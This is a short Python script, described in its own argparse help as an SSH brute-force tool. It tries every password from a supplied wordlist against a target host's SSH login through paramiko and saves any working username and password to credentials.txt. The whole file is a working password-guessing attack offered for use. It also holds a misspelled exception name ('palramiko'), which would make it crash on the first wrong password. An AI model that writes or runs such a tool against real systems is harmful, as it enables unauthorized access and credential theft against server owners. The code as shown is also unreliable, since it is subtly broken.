#!/usr/bin/env python3
import paramiko
import socket
import time

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:  
        print(f"[!] Host: {hostname} is unreachable, timed out.")
        return False
    except palramiko.AuthenticationException:    
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    else:
        # connection was established successfully
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force , when found print and save it to a file
    for password in passlist:
        if is_ssh_open(host, user, password):
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break